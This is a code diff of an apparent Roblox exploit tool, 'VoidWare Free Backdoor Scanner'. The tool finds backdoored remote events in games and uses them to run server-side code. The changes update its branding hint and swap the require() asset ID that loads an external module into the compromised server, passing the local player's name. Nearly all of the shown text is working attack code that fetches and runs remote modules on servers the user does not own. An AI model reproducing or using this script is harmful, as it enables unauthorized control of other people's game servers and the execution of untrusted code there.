@@ -430,7 +430,7 @@ local function findRemote()
                 G2L["ScreenGui_13"].Enabled = true
 
                 runRemote(remote, "require(171016405.1884*69)")            
-                runRemote(remote, "a=Instance.new('Hint')a.Text='VoidWare | Free Backdoor Scanner'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
+                runRemote(remote, "a=Instance.new('Hint')a.Text='VoidWare | Free Backdoor Scanner | Made by StarFlow'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
                 
                 updateStatus("Backdoor found!", Color3.fromRGB(0, 255, 0))
                 return true
@@ -489,7 +489,7 @@ end)
 G2L["Sens_17"].MouseButton1Click:Connect(function()
     if backdoor then
         local playerName = Players.LocalPlayer.Name
-        runRemote(backdoor, "require(85380043749737)('"..playerName.."', ColorSequence.new(Color3.fromRGB(128, 0, 128), Color3.fromRGB(0, 0, 0)), \"Standard\")")
+        runRemote(backdoor, "require(100263845596551)('"..playerName.."', ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(128, 0, 128)), ColorSequenceKeypoint.new(0.25, Color3.fromRGB(102, 0, 153)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(153, 51, 255)), ColorSequenceKeypoint.new(0.75, Color3.fromRGB(75, 0, 130)), ColorSequenceKeypoint.new(1, Color3.fromRGB(128, 0, 128))}), \"Standard\")")
         G2L["Sens_17"].Text = "Loaded!"
         buttonClickEffect(G2L["Sens_17"])
         task.wait(0.5)
